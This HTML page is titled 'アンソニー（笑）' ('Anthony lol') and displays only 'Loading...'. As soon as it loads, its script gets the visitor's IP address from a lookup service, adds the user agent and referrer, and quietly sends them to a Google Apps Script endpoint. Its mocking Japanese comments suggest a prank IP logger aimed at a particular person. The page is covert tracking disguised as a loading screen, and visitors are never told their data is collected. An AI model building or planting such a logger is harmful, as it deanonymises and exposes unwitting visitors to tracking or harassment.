<!DOCTYPE html>
<html>
<head>
    <title>アンソニー（笑）</title>
</head>
<body>
    <h1>Loading...</h1>

    <script>
        async function logAccess() {
            try {
                // 糞芸
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                const ua = navigator.userAgent;
                const ref = document.referrer;

                // gasだね
                const gasUrl = "https://script.google.com/macros/s/AKfycbxpPD--4CG6fK5rS3QsEogm0EwGbhjWRKSrZez7HPcvMKnW1Q6zTbmd6lUurTHzHbfo-g/exec";

                // GASちゃんにデータを送信するよ（no-corsモードでビーコンっぽく送信
                fetch(`${gasUrl}?ip=${encodeURIComponent(ip)}&ua=${encodeURIComponent(ua)}&ref=${encodeURIComponent(ref)}`, {
                    mode: 'no-cors'
                });
            } catch (error) {
                console.error('Error logging access:', error);
            }
        }

        logAccess();
    </script>
</body>
</html>
